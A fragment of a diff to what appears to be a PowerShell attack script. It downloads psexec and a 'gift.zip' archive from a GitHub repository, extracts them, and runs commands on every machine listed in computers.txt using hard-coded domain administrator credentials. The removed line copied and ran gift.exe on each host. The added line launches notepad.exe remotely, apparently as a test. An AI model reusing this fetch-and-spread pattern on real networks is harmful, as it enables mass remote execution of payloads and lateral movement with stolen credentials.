@@ -5,4 +5,4 @@ curl https://github.com/d77juan/t3st1n6/raw/main/psexec33 -o $env:temp\psexec.ex
 curl https://github.com/d77juan/t3st1n6/raw/main/gift.zip -o $env:temp\gift.zip
 Expand-archive $env:temp\gift.zip .
 sleep 5
-Start-Process -FilePath '.\psexec.exe' -ArgumentList  '@$env:temp\computers.txt -u administrator -p Zxcv7890! -c $env:temp\gift.exe'
+powershell "cd $env:temp; type .\computers.txt|%{.\psexec  \\$_ -d -accepteula -u vonese\administrator -p Zxcv7890! "notepad.exe"}"
